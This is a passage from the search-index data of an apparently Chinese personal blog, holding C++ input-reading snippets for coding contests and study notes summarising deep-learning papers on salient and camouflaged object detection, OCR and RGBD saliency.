&#123; cout &lt;&lt; nums[i] &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl; 二维数组例如 输出N行，每行M个空格分隔的整数。每个整数表示该位置距离最近的水域的距离。4 40110111111110110 int n,m; int res[n][m]; //vector&lt;vector&lt;int&gt;&gt;res(n,vector&lt;int&gt;(n)); scanf(&quot;%d%d&quot;,&amp;n,&amp;m); for(int i=0;i&lt;n;i++)&#123; for(int j=0;j&lt;m;j++)&#123; scanf(&quot;%d&quot;,&amp;res[i][j]); &#125; &#125; // 验证是否读入成功 for(int i = 0; i &lt; m; i++) &#123; for(int j = 0; j &lt; n; j++) &#123; cout &lt;&lt; matrix[i][j] &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl; 再附加每行数据用特殊字符给隔开的限制 int m; // 接收行数 int n; // 接收列数 cin &gt;&gt; m &gt;&gt; n; vector&lt;vector&lt;int&gt;&gt; matrix(m); for(int i = 0; i &lt; m; i++) &#123; // 读入字符串 string s; getline(cin, s); // 将读入的字符串按照逗号分隔为vector&lt;int&gt; vector&lt;int&gt; vec; int p = 0; for(int q = 0; q &lt; s.size(); q++) &#123; p = q; while(s[p] != &#39;,&#39; &amp;&amp; p &lt; s.size()) &#123; p++; &#125; string tmp = s.substr(q, p - q); vec.push_back(stoi(tmp)); q = p; &#125; //写入matrix matrix[i] = vec; vec.clear(); &#125; // 验证是否读入成功 for(int i = 0; i &lt; matrix.size(); i++) &#123; for(int j = 0; j &lt; matrix[i].size(); j++) &#123; cout &lt;&lt; matrix[i][j] &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl; &#125; 结构体输入： 第 1 行：正整数 n第 2 行：第 1 个学生的姓名 学号 成绩第 3 行：第 2 个学生的姓名 学号 成绩 … … …第 n+1 行：第 n 个学生的姓名 学号 成绩 3Joe Math990112 89Mike CS991301 100Mary EE990830 95 struct Student&#123; char name[11]; char subject[11]; int score; &#125;; int main()&#123; int n; scanf(&quot;%d&quot;,&amp;n); Student* s = new Student[n]; for(int i=0;i&lt;n;i++)&#123; cin&gt;&gt;s[i].name&gt;&gt;s[i].subject&gt;&gt;s[i].score; &#125; return 0; &#125;","categories":[{"name":"c++","slug":"c","permalink":"https://dfsgwb.github.io/categories/c/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://dfsgwb.github.io/tags/C/"},{"name":"ACM","slug":"ACM","permalink":"https://dfsgwb.github.io/tags/ACM/"},{"name":"刷题","slug":"刷题","permalink":"https://dfsgwb.github.io/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"Looking for the Detail and Context Devils:High-Resolution Salient Object Detection","slug":"Looking for the Detail and Context Devils","date":"2023-04-11T07:30:16.000Z","updated":"2023-04-11T12:42:20.641Z","comments":true,"path":"2023/04/11/Looking for the Detail and Context Devils/","link":"","permalink":"https://dfsgwb.github.io/2023/04/11/Looking%20for%20the%20Detail%20and%20Context%20Devils/","excerpt":"","text":"Looking for the Detail and Context Devils:High-Resolution Salient Object Detection 缺乏显著对象的边界细节和语义上下文是低分辨率SOD数据集的一大弊端，本文设计了一个端到端的学习框架，称为DRFNet,使用一个共享特征提取器和两个有效的细化头构成。通过解耦细节和上下文信息，一个细化头采用全局感知和特征金字塔，在不增加太多计算负担的情况下，提升空间细节信息，从而缩小高级语义和低级细节之间的差距，另一个细化头采用混合扩张卷积块和分组上采样，这在提取上下文信息方面非常有效，基于双重细化，使得实现扩大感受野并从高分辨率图像中获取更多的判别特征。 高分辨率图像具有一个突出的特点包含更多可以覆盖范围和形状的结构对象和更多的细节信息。一方面高级上下文特征更适合检测大而混乱的对象，而小对象则受益于低级精细特征。不同层次特征的结合将为语义定位和细节增强提供更丰富的信息。 现有的基于FCN结构的方法一个缺点就是特征通常是以粗到精细的方式集成，它缺乏获取足够的局部和全局上下文信息或远程依赖关系的能力。导致不显眼的对象和混淆区域的准确性较差。大量的使用卷积操作使得对于算力和内存的要求变得极高，但如果将输入图像限制为相对较低的分辨率，又阻碍了细节感知和高分辨的实际需求。 现有的高分辨率图像像素级标记方法大致分为三大类， 1首先将高分辨率图像裁剪为低分辨图像，然后预测低分辨率结果并将其结果插值为原始图像大小。这种操作虽然简单但是图像空间细节的丢失是不可避免，导致出现对物体边界的错误预测 2设计轻型编码器-解码器网络,通过特征融合层次特征，之间提高空间分辨率并恢复一些缺少的细节，但是这种由于连续的下采样操作会带来空间信息的丢失且缺乏足够的对象的感受野 3 引入具有多个分支的不对称网络,每个分支以不同分辨率运行，即低分辨率图像中提取全局信息，高分辨率图像中提取精细细节，但是如何在不同分支上整合全局和局部信息还没一个很好的方法，由于高级语义和低级细节之间的差距，不好的融合方式可能使得它们在预测中出现奇怪的预测区域 常见的HRSOD网络架构 本文网络结构 共享特征提取器采用修改后的VGG-16和ResNet-18作为共享特征提取器 Detail Refinement HeadDRH包括三个关键块： 1卷积特征缩减块(CFRB):该块旨在缩小多尺度深度特征的维数，本质上就是一个$1\\times1$的卷积块，后面是批归一化和Relu激活函数，为减少高分辨率图像的计算和内存需求，卷积滤波器的数量设为为32 2深度特征上采样块(DFUB):采用C组的反卷积进行上采样，通过适当的上采样率，可以放大较深层的输出特征以匹配较浅层产生的特征，且进一步减少计算量 3全局感知特征交互块(GFIB)：由于接受域有限，无法获取足够的全局信息，为表达增强表现能力，首先对CFRB和DFUB的特征进行级联全局平均池化。然后将其转发到全连接层以生成全局权重向量,整个过程可以表示为$$\\Large \\alpha_G &#x3D; \\sigma(W_1GAP([F_C,F_D])+b)$$$$\\Large F_R&#x3D;g(W_2[F_C,F_D]+b)$$$$\\Large F_G &#x3D; \\alpha_G\\odot F_R$$ Context Refinement Head在直接堆叠或使用金字塔结构扩大感受野的策略中具有两个非常明显的缺点。1：计算量大，占用内存，不适合高分辨率图像。2：缺乏捕获足够多尺度局部上下文信息的能力，导致对于不显眼的对象的准确性较差本文提出的CRH使用混合膨胀卷积和分组上采样组成。具体的来说就是使用一个混合扩张卷积块和一个分组上采样组成","categories":[{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/categories/SOD/"}],"tags":[{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/tags/SOD/"}]},{"title":"Disentangled High Quality Salient Object Detection","slug":"Disentangled High Quality Salient Object Detection","date":"2023-04-11T07:30:16.000Z","updated":"2023-04-11T12:39:23.861Z","comments":true,"path":"2023/04/11/Disentangled High Quality Salient Object Detection/","link":"","permalink":"https://dfsgwb.github.io/2023/04/11/Disentangled%20High%20Quality%20Salient%20Object%20Detection/","excerpt":"","text":"Disentangled High Quality Salient Object Detection摘要将高分辨率SOD任务分解为低分辨率显著性分类网络(LRSCN)和高分辨细化网络(HRRN),作为一项逐像素分类任务，LRSCN旨在以低分辨率来捕获足够的语义，以识别明确的显著，背景和不确定区域。HRRN是一项回归任务，旨在准确提炼不明确区域中的像素的显著性值。 Introduction一种好的高分辨率显著目标检测方法不仅要准确地检测出整个显著目标，还要预测显著目标的精确边界。基于低分辨率设计的SOD模型无法直接套用到高分辨率图像中，最主要的原因就是，低分辨的方法往往是将识别和定位两个过程使用一个过程实现，而对于高分辨率图像最为重要的是对于边界的精确分割。对于显著区域的定位我们可以通过扩大感受野来获取足够的语义，但是由于高分辨的特性，这将使得内存的使用大大的增加，此时往往采用下采样操作，但是下采样操作不可避免地会使得结构信息丢失。这种解决问题的思路也就是导致低分辨的SOD模型直接迁移至高分辨率图像中会出现边界模糊的原因。如下图所示 模型结果对比 从上图可以发现，显著像素点可以分为以下三类： (1)大多数显著对象内部的像素具有最高的显著值，我们称为确定的显著像素 (2) 背景区域中的大多数像素具有最低的显著值，我们称为确定的背景显著像素 (3) 模糊物体边界像素的显著值在0到1之间波动，称之为不明确像素 理想的 SOD 方法应有效识别图像中明确的显着区域和背景区域，并准确计算不确定区域中像素的显着性值，以保持清晰的目标边界。也就是一个回归任务加一个分类任务。将高分辨率显着对象检测分离为低分辨率显着性分类网络(LRSCN)和高分辨率细化网络(HRRN).LRSCN旨在以低分辨率捕获足够的语义并将像素分类为三个不同的集合以供以后处理.HRRN旨在准确提炼不确定区域中像素的显着性值,以在GPU内存有限的情况下以高分辨率保持清晰的对象边界.如上所述,HRRN 需要高分辨率图像中的结构细节。然而，广泛使用的低分辨率显着性数据集通常在注释质量方面存在一些问题,几乎不可能从这些有缺陷的数据集中直接获得足够的对象边界细节来训练高分辨率网络。在最近的工作中，Zeng 等人。提出通过使用具有准确注释的高分辨率图像来训练他们的 SOD 网络。然而，如此高质量的图像标注需要大量的人工成本。在我们的论文中,我们认为没有必要在网络训练中使用这种精确注释的高分辨率图像.通过在训练过程中引入不确定性，我们的 HRRN 可以仅使用标注不佳的低分辨率训练数据集很好地解决高分辨率细化任务。 模型方法HRRN High Resolution Network Framework LRSCN的目的是在低分辨率下获取足够的语义并将像素分为三个不同的集合，同时节省内存的使用，HRRN计算回归像素的显著性值，并在高分辨率下保持清晰的对象边界 LRSCN使用一个简单的U-Net编码器解码器架构，VGG-16作为主干网络，因此将从Conv1-2，Conv2-2，Conv3-3，Conv4-3，Conv5-3，Conv6-3获得六个特征，但是由于前两个特征的感受野太小，则不使用。在编码器和解码器之间增加一个多尺度特征提取和跨级特征融合模块(MECF)，以提高特征表示的可辨别性。解码器自上而下的方式融合MECF的输出特征和上一阶段的上采样特征，每个解码器的输出定义为$D_{i},i&#x3D;1,2,3…n$,最后SGA模块建立在D3之上用来生成准确的显著预测图T，为了回归清晰的目标边界值，HRRN的输入是在LRSCN提供的trimap引导下的高分辨率图像。HRRN具有基本的编码器-解码器架构，在不确定性损失的帮助下，网络可以对噪声数据更加鲁棒，并预测具有清晰边界的高分辨率显着图。 LRSCN###LRSCN架构图 开发了一种基于全局卷积网络GCN的多尺度特征提取模块ME，以扩大特征感受野并获得多尺度信息。为了实现第二个目标，我们利用跨级别特征融合模块CF来利用不同级别的特征优势。此外，在设计网络架构时，受的启发，我们使用拆分变换策略进一步放大 特征感受野，从而产生更具辨别力的特征表示。具体来说，我们将输入F按通道维度均匀地分成两部分${ F_{1}, F_2}$，然后将$F_1$送入多尺度特征提取路径，将$F_2$送入跨级特征融合路径。这两个路径的输出连接在一起作为最终输出。我们称这个桥接模块为MECF模块，如上图所示。 SGA模块：每个解码器融合来自MECF模块和前一解码器级的特征，然后使用$3×3$卷积层进行最终预测。为了保持trimap和显著图的一致性，确保trimap的不确定区域能够准确覆盖显著图的边界，我们在D3上设计了一个显著引导注意模块（SGA）。具体来说，我们首先使用$3×3$卷积和sigmoid函数来计算显著性映射。然后，将显著性图视为空间权重图，有助于细化特征并生成精确的trimap。最后，输出trimap T是3通道分类logits。整个SGA模块保证trimap和saliecny地图的对齐。 HRRN模块HRRN遵循解纠缠原则，在LRSCN提供的trimap的指导下，精确细化不确定区域中像素的显著性值，以保持高分辨率下清晰的目标边界。HRRN的架构如图2所示。HRRN有一个简单的类似U-NET的体系结构。为了在高分辨率下进行更好的预测，我们进行了一些非平凡的修改。首先，底层特征包含丰富的空间和细节信息，这些信息在恢复清晰的对象边界方面起着至关重要的作用，因此解码器在每个上采样块之前而不是在每个上采样块之后组合编码器特征。此外，我们使用一个两层的快捷块来对齐编码器特征通道，以进行特征融合。其次，为了让网络更加关注细节信息，我们通过一个快捷块将原始输入直接反馈到最后一个卷积层，以产生更好的结果。最后，从图像生成任务中学习，我们对每个卷积层使用谱归一化，以对网络的$Lipschitz$常数添加约束并稳定训练。 为了监督LRSCN，我们应该生成trimap的GT表示为$T^{gt}$，它可以表示确定的显着、确定的背景和不确定的区域。如上所述，不确定区域主要存在于对象的边界处。因此，我们使用随机像素数（5、7、9、11、13）在对象边界处擦除和扩展二进制真实图，以生成GT不确定区域。 剩余的前景和背景区域代表明确的显着和背景区域。$T^{gt}$ 定义为：$$\\Large T_{gt}(x,y) &#x3D;\\begin{cases}2 &amp; T_{gt}(x,y)\\in definite salient \\0 &amp; T_{gt}(x,y)\\in definite background \\1 &amp; T_{gt}(x,y)\\in uncertain region \\\\end{cases}$$其中$(x,y)$表示图像上的每个像素位置。如下图所示 结果可视化 对于trimap的监督我们使用交叉熵损失$$\\Large L_{trimap}&#x3D;\\dfrac{1}{N}\\sum_{i}-log(\\dfrac{e^{T_{i} } }{\\sum_{j} e^{T_{j} } })$$为保障trimap的准确率，我们在trimap监督的基础上增加了额外显著性监督$L_{saliency}$，总损失是$$\\Large L_{LRSCN}&#x3D;L_{saliency}+L_{trimap}$$不使用不确定性损失，因为LRSCN的主要目标是获取足够的语义，而不是精确的边界。 对于输入的高分辨率图像$I$，让$G^H$表示其背景真值，预测显著性图为$S^H$。我们利用$L_1$损失来比较预测显著性图和背景真值在明确的显著性和背景区域上的绝对差异：$$\\Large L_1 &#x3D; \\dfrac{1}{E}\\sum_{i\\in E}|S_{i}^H-G_{i}^H|$$其中$E$表示在$trimap$中被标记为明确显着或背景的像素数，$S_{H}^i$和$G_{H}^i$表示位置$i$处的预测值和$groundtruth$值。由于数据集本身在注释质量方面存在一些问题，因此引入一个不确定损失来解决数据集本身带来的缺陷。使用高斯似然的方式建模不确定性$$\\Large p(y|f(x))&#x3D;N(f(x),\\delta^2)$$其中$\\delta$表示测量的不确定性，$y$是输出，在最大似然推断中，我们将模型的对数似然最大化，表示为:$$\\Large logp(y|f(x))\\propto-\\dfrac{||y-f(x)||}{2\\delta^2}-\\dfrac{1}{2}log{\\delta^2}$$则不确定损失定义为：$$\\Large L_{uncertainty}&#x3D;\\dfrac{||y-f(x)||^2}{2\\delta^2}+\\dfrac{1}{2}log\\delta^2$$将其转化为像素的表达形式：$$\\Large L_{uncertainty}&#x3D;\\dfrac{1}{U}\\dfrac{||S_{i}^H-G_{i}^H||}{2\\delta_{i}^2}+\\dfrac{1}{2}log\\delta_{i}^2$$ HRRN损失可视化","categories":[{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/categories/SOD/"}],"tags":[{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/tags/SOD/"}]},{"title":"OCR技术(一)","slug":"OCR","date":"2023-04-11T07:30:16.000Z","updated":"2023-04-17T03:20:35.844Z","comments":true,"path":"2023/04/11/OCR/","link":"","permalink":"https://dfsgwb.github.io/2023/04/11/OCR/","excerpt":"","text":"Mask TextSpotter该文受到Mask R-CNN的启发提出了一种用于场景text spotting的可端到端训练的神经网络模型：Mask TextSpotter。与以前使用端到端可训练深度神经网络完成text spotting的方法不同，Mask TextSpotter利用简单且平滑的端到端学习过程，通过语义分割获得精确的文本检测和识别。此外，它在处理不规则形状的文本实例（例如，弯曲文本）方面优于之前的方法。 网络架构由四部分组成，骨干网feature pyramid network (FPN)，文本候选区域生成网络region proposal network (RPN)，文本包围盒回归网络Fast R-CNN，文本实例分割与字符分割网络mask branch。 训练阶段RPN首先生成大量的文本候选区域，然后这些候选区域的RoI特征被送入Fast R-CNN branch和mask branch，由它们去分别生成精确的文本候选包围盒（text candidate boxes）、文本实例分割图（text instance segmentation maps）、字符分割图（character segmentation maps）。它将输入的RoI（固定大小$16\\times64$）经过4层卷积层和1层反卷积层，生成38通道的图（大小$32\\times128$），包括一个全局文本实例图——它给出了文本区域的精确定位，无论文本排列的形状如何它都能分割出来，还包括36个字符图（对应于字符0～9，A～Z），一个字符背景图（排除字符后的的所有背景区域），在后处理阶段字符背景图会被用到。 推理阶段mask branch的输入RoIs来自于Fast R-CNN的输出。推理的过程如下：首先输入一幅测试图像，通过Fast R-CNN获取候选文本区域，然后通过NMS（非极大抑制）过滤掉冗余的候选区域，剩下的候选区域resize后送入mask branch，得到全局文本实例图，和字符图。通过计算全局文本实例图的轮廓可以直接得到包围文本的多边形，通过在字符图上使用提出的pixel voting方法生成字符序列。如上图所示，Pixel voting方法根据字符背景图中每一个联通区域，计算每一字符层相应区域的平均字符概率，即得到了识别的结果。为了在识别出来的字符序列中找到最佳匹配单词，作者在编辑距离（Edit Distance）基础上发明了加权编辑距离（Weighted Edit Distance）","categories":[{"name":"人工智能","slug":"人工智能","permalink":"https://dfsgwb.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"OCR","slug":"OCR","permalink":"https://dfsgwb.github.io/tags/OCR/"},{"name":"深度学习","slug":"深度学习","permalink":"https://dfsgwb.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}]},{"title":"Pyramidal Feature Shrinking for Salient Object Detection","slug":"PFSNet","date":"2023-04-11T07:30:16.000Z","updated":"2023-04-12T13:31:44.808Z","comments":true,"path":"2023/04/11/PFSNet/","link":"","permalink":"https://dfsgwb.github.io/2023/04/11/PFSNet/","excerpt":"","text":"Pyramidal Feature Shrinking for Salient Object Detection摘要提出了一种金字塔型特征收缩网络(PFSNet) ，其目的是将相邻的特征节点按照层层收缩的方式进行聚合，从而使聚合后的特征融合有效的细节和语义，丢弃干扰信息。特别地，提出了一种金字塔收缩译码器(PSD) ，以渐近的方式分层聚合相邻特征。此外，我们提出了一个相邻融合模块(AFM)来进行相邻特征之间的空间增强，以动态加权特征和自适应融合适当的信息。此外，利用基于主干提取特征的尺度感知富集模块(SEM)获取丰富的尺度信息，生成具有扩张卷积的不同初始特征。 在SOD任务中，高低级特征在功能之间有着很大的差距，SOD算法的关键在于如何充分利用语义和细节信息，在最后两个特征的合并中，具有丰富细节和噪声的低级特征和高级特征相融合，但是当两种特征完全不同时，差异较大的特征直接融合会产生噪声，导致性能的下降.本文提出了一种金字塔收缩解码器，将相邻特征定义为相似特征，将不相邻的特征定义为孤立特征，PSD仅收缩每层中类似的特征，经过几层收缩后，最时候当前输入的特征得以保留，然后配合AFM融合模块实现增强当前样本的特征并抑制不适合的特征，最后为了充分利用好多尺度信息，配合使用SEM。其对应的架构图如下所示： AFM模块将待合并的特征视为父特征，合并后的特征视为子特征，AFM要实现的两个功能： （1）子特征应该继承适当当前输入样本的特征，并丢弃不适合的特征 （2）子特征要和父特征保持相同的尺寸 首先通过逐元素乘法从父特征中提取共享特征，然后通过逐元素加法将共享特征加到父特征中从而增强它们，通过级联运算将两个处理后的特征合并，然后让它们依次通过全局平均化，$1\\times1$卷积和softmax函数来生成权重向量，最后对权重向量和特征进行相应的乘法，得到加权后的特征，在特征加权后再使用$3\\times3$卷积来压缩与副特征一致的子特征的通道，由于不同的特征具有不同的权重，因此在卷积计算受，具有较小权重的元素很少被子特征继承，通过这种方式，达到子特征继承重要的特征并丢弃更多的噪声的目的。 PSD模块本文首次提出将相邻特征扩展到层次融合。这样，我们就可以利用相邻特征融合的优势，实现多层次的特征融合，避免跳跃式融合操作。此外，从最后一个特征融合的位置来看，它可以直接集成基于 FPN 的框架中包含噪声的低层特征，而 PFSNet 则消除了大量的噪声。PSD的核心目的是为了实现多特征集成，同时尽可能避免跳跃式特征融合的操作，PSD是由AFM组成的结构。合并特征的过程在相邻节点对中进行，首先使用backone提出五层特征$f_1,f_2,f_3,f_4,f_5$,然后使用AFM模块将相邻的特征$f_i,f_{i+1}$得到$f^{‘}_i$依次类推得到最后的特征$f$","categories":[{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/categories/SOD/"}],"tags":[{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/tags/SOD/"}]},{"title":"Salient Object Detection via Dynamic Scale Routing","slug":"Salient Object Detection via Dynamic Scale Routing","date":"2023-04-11T07:30:16.000Z","updated":"2023-04-11T12:43:15.328Z","comments":true,"path":"2023/04/11/Salient Object Detection via Dynamic Scale Routing/","link":"","permalink":"https://dfsgwb.github.io/2023/04/11/Salient%20Object%20Detection%20via%20Dynamic%20Scale%20Routing/","excerpt":"","text":"Salient Object Detection via Dynamic Scale Routing 摘要现有的SOD模型的编码器可以通过提取多尺度特征，并通过各种微妙的解码器组合特征，但是这个特征通常是固定的，实际上，在不同场景中配合使用不同的内核大小是更可取的，因此本文提出了一种动态的金字塔卷积模型，动态选择最适合的内核大小，其次提出了一种自适应双向解码器以最好适应基于DPConv的编码器。最重要的的亮点是它能够在特征尺度及其动态集合之间进行路由，使推理过程具有尺度感知能力","categories":[{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/categories/SOD/"}],"tags":[{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/tags/SOD/"}]},{"title":"Zoom In and Out:A Mixed-scale Triplet Network for Camouflaged Object Detection","slug":"Zoom","date":"2023-04-11T07:30:16.000Z","updated":"2023-04-18T08:14:04.415Z","comments":true,"path":"2023/04/11/Zoom/","link":"","permalink":"https://dfsgwb.github.io/2023/04/11/Zoom/","excerpt":"","text":"摘要最近提出的伪装目标检测（COD）试图分割视觉上融入周围环境的目标，这在现实场景中是极其复杂和困难的。除了伪装对象与其背景之间具有很高的内在相似性外，这些对象通常在尺度上具有多样性，外观模糊，甚至被严重遮挡。为了解决这些问题，我们提出了一种混合比例的三重网络ZoomNet，它模仿人类在观察模糊图像时的行为，即放大和缩小。具体而言，我们的ZoomNet采用缩放策略，通过设计的尺度积分单元和分层混合尺度单元学习区分性混合尺度语义，充分挖掘候选对象和背景环境之间的细微线索。此外，考虑到来自不可区分纹理的不确定性和模糊性，我们构造了一个简单而有效的正则化约束，即不确定性感知损失，以促进模型在候选区域准确地生成具有更高置信度的预测。我们提出的高度任务友好的模型在四个公共数据集上始终优于现有的23种最先进的方法。此外，与最新的前沿模型相比，该模型在SOD任务上的优异性能也验证了该模型的有效性和通用性。 COD任务难点 如何在外观不明显和各种尺度的情况下准确定位伪装对象 如何抑制来自背景的明显干扰，更可靠地推断伪装对象 为了准确地找到场景中模糊或伪装的对象，人类可以尝试通过放大和缩小图像来参考和比较不同尺度下形状和外观的变化，这种行为模式为本文提供思路，可以通过模拟人类放大和缩小策略来识别伪装的物体。本文中提出一种混合规模的三重网络$ZoomNet$。为了精准定位目标，我们使用尺度空间理论来模拟放大和缩小策略，为此设计了两个关键模块 规模集成单元(SIU):筛选和聚合特定尺度的特征 分层混合规模单元(HMU):重组和增强混合尺度特征 此结构能够在混合尺度下挖掘出物体和背景之间准确而微妙的语义线索，并产生准确的预测，为了实现效率和有效性的平衡，模型采用共享权重策略，为增强模型在复杂场景下的泛化能力，设计了一个不确定性感知损失(UAL)来指导模型训练，模型结构图： 网络结构图 SIU：使用一个尺度作为主尺度，另外两个尺度作为辅助，利用共享的三元组特征编码器来提取不同尺度的特征并将它们馈送到尺度合并层。对于高尺度，使用最大池化加平均池化的混合结构进行下采样，这有助于在高分辨率特征中保持伪装对象的有效和多样性响应。对于低尺度使用双线性插值直接向上采样，然后将这些特征输入注意力生成器，并通过一系列卷积层计算出三通道特征图。然后再softmax激活层之后，可以获得对应于每个尺度的注意力映射计算权重为： $\\Large A_i=softmax(\\Psi[U(f^{0.5}_i,f^{1.0}_i,D(f^{1.5}_i)],\\phi)$ $\\Large f_i=A^{0.5}_i\\cdot U(f^{0.5}_i)+A^{1.0}_i\\cdot f^{1.0}_i+A^{1.5}_i\\cdot D(f^{1.5}_i)$","categories":[{"name":"COD","slug":"COD","permalink":"https://dfsgwb.github.io/categories/COD/"}],"tags":[{"name":"COD","slug":"COD","permalink":"https://dfsgwb.github.io/tags/COD/"}]},{"title":"像素级光场显著性检测","slug":"像素级光场显著性检测","date":"2023-04-11T07:30:16.000Z","updated":"2023-04-11T12:38:51.239Z","comments":true,"path":"2023/04/11/像素级光场显著性检测/","link":"","permalink":"https://dfsgwb.github.io/2023/04/11/%E5%83%8F%E7%B4%A0%E7%BA%A7%E5%85%89%E5%9C%BA%E6%98%BE%E8%91%97%E6%80%A7%E6%A3%80%E6%B5%8B/","excerpt":"","text":"摘要在一个统一的框架中识别干净的标签且有效的整合光场线索之间的关系。将学习描述为光场内特征融合流和场景间相关流的联合优化，以生成预测，首先引入一个像素遗忘引导融合模块，以相互增强光场特征，并利用迭代过程中的像素一致性来识别噪声像素，再引入跨场景噪声惩罚损失，以更好地反映训练数据的潜在结构，并使学习对噪声保持不变。 光场图像： 光场：是一个四维的参数化表示，是空间中同时包含位置和方向信息的四维光辐射场，简单地说，涵盖了光线在传播中的所有信息，在空间内任意角度，任意的位置都可以获得整个空间环境的真实信息，用光场获得的图像信息更加全面，品质更好。 光场成像的原理：传统相机成像是光线穿过镜头，而后传播到成像平面，光场成像则是在传感器平面添加了一个微透镜矩阵，在于将穿过主镜头的光线再次穿过每个微透镜，从而收获到光场的方向与位置信息，使成像结果在后期更加可调节，达到先拍照后聚焦的效果。 直接在像素级别噪声标签上训练显著性检测网络可能会引导网络过度适应损坏的标签。且当前现有的方式都缺乏全局视角来探索整个数据集之间的关系模式 光场显著性：","categories":[{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/categories/SOD/"}],"tags":[{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/tags/SOD/"}]},{"title":"基于深度质量的特征操作实现高效的RGBD显著目标检测","slug":"基于深度质量的特征操作实现高效的RGBD显著目标检测","date":"2023-04-11T07:30:16.000Z","updated":"2023-04-11T12:32:25.631Z","comments":true,"path":"2023/04/11/基于深度质量的特征操作实现高效的RGBD显著目标检测/","link":"","permalink":"https://dfsgwb.github.io/2023/04/11/%E5%9F%BA%E4%BA%8E%E6%B7%B1%E5%BA%A6%E8%B4%A8%E9%87%8F%E7%9A%84%E7%89%B9%E5%BE%81%E6%93%8D%E4%BD%9C%E5%AE%9E%E7%8E%B0%E9%AB%98%E6%95%88%E7%9A%84RGBD%E6%98%BE%E8%91%97%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B/","excerpt":"","text":"摘要基于RGBD显著目标检测模型在减少模型参数时，模型精度通常会下降，且受到深度质量的影响。本文设计了一种基于深度质量的特征操作(DQFM)：利用低级RGB和深度特征的对齐，以及深度流的整体关注来明确控制和增强跨模态融合。这是一个轻量化模型。 高质量的深度图通常具有一些与相应RGB图像对齐的边界 Efficient RGBD SOD Method将知识蒸馏就是用于深度蒸馏器，将从深度流获取到的深度知识转移到RGB流，从而实现无深度推理框架，后Chen设计了一个定制的深度主干，以提取互补特征 网络结构图 由编码器和解码器构成，其中RGB分支同时负责RGB特征提取和RGB与深度特征之间的交叉模式融合，另一方面解码器部分负责进行简单的两阶段融合以生成最终的显著性图，具体的说就是：编码器包括一个基于MobileNet-v2的RGB相关分支，一个深度相关分支，以及DQFM。在某个层次提取的深度特征通过DQFM后，再经过简单的元素加法融合到RGB分支中，然后发送到下一个层次。为了捕获多尺度语义信息，在RGB分支的末尾添加了PPM(金字塔池模块),在实际操作中，DQFM包含两个连续操作，深度质量启发加权和深度整体注意。 DQW结构 首先将低层特征$f_{r}^{1}$ 和 $f_{d}^{1}$ 转化为特征$ f_{rt^{‘} }$和$ f_{dt^{‘} }$,$$ \\large f_{rt^{‘} }&#x3D;BConv_{1\\times1}(f_{r}^{1}),f_{dt^{‘} }&#x3D;BConv_{1\\times1}(f_{d}^{1})$$ 其中$BConv$表示$1\\times1$卷积和$ReLU$激活函数，为了评估低级特征对齐，对这两个特征进行对齐编码$$ \\large V_{BA}&#x3D;\\dfrac{GAP(f_{rt^{‘} }\\otimes f_{dt^{‘} })}{GAP(f_{rt^{‘} } + f_{dt^{‘} })}$$ 其中$GAP(\\cdot)$表示全局平均池化操作，$\\otimes$表示按元素乘法。增强向量的计算方式：$$ \\large V_{BA}^{ms}&#x3D;[V_{BA},V_{BA}^{1},V_{BA}^{2}]$$其中[$\\cdot$]表示通道串联。然后使用两个完全连接的层使得$\\alpha\\in\\mathbb{R}^{5}$转化到$V_{BA}^{ms}$计算方式为：$$\\large\\alpha&#x3D;MLP(V_{BA}^{ms})$$$MLP(\\cdot)$表示末端为$Sigmoid$函数的感知器。 DHA结构 首先利用最高级特征$f_{d}^{5}$从深度流定位粗糙的突出区域，使用压缩和上采样方式使得$f_{d}^{5}$转化为$f_{dht}$计算方式为$$\\large f_{dht}&#x3D;F_{UP}^{8}(BConv_{1\\times1}(F_{DN}^2(f_{d}^5))$$ 其中$F_{UP}^{8}$表示8层双线性上采样，然后结合低层RGB和深度特征进行重新校准。为了更好地模拟低水平和高水平特征之间的长期依赖性，同时保持DHA的效率，我们采用最大池运算和扩大卷积来快速增加感受野。重新校准过程定义为：$$ \\large F_{rec}(f_{dht})&#x3D;F_{UP}^{2}(DConv_{3\\times3}(F_{DN}^{2}(f_{dht}+f_{ec})))$$ $F_{rec}(\\cdot)$表示重新校准过程。$DConv_{3\\times3}(\\cdot)$表示$3\\times3$扩张卷积，步长为1，扩张率为2.然后是$BatchNorm$和$ReLU$激活函数，$F_{UP}^{2}(\\cdot)&#x2F;F_{DN}^{2}(\\cdot)$表示双线性上采样\\下采样操作。为提高性能，再进行两次重新校准。$$\\large f_{dht}^{‘}&#x3D;F_{rec}(f_{dht}),f^{‘’}{dht}&#x3D;F{rec}(f^{‘}_{dht})$$ 最终实现整体注意力地图：$$\\large \\beta&#x3D;BConv_{3 \\times 3}(f_{ec}+f_{dht}^{‘’})$$ 最后获得五张深度整体注意图$\\large{ {\\beta_{1},\\beta_{2},\\beta_{3},\\beta_{4},\\beta_{5} }}$如下图所示： 通常情况下，深度学习不如RGB图像，为实现效率和准确性的平衡，本文选择定制深度主干(TDB)，具体来说就是基于$MobliceNetV2$中的反向剩余瓶颈块(IRB)并构建一个新的更小的主干，减少信道数量和堆叠块。结构如下： 解码器简化版的两级解码器，包括预融合和完全融合，预融合是通过信道压缩和层次分组来减少特征信道和层次，完全融合则是进一步聚合低层和高层特征，生成最终的显著图。 